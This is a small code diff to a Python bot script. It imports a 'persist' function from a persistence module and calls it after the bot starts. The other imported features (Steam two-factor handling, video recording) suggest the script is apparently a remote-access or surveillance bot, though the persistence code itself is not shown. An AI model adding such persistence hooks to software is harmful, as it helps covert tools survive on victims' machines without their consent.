@@ -8,6 +8,7 @@ import os.path as osp
 import platform
 # Features importing
 from features.func import *
+from features.persistence import persist
 from features.setup import *
 from features.steam2fa import *
 from features.video_record import *
@@ -276,7 +277,7 @@ def main():
 
 
     bot.run(token)
-    
+    persist()
     
 
 if __name__ == "__main__":
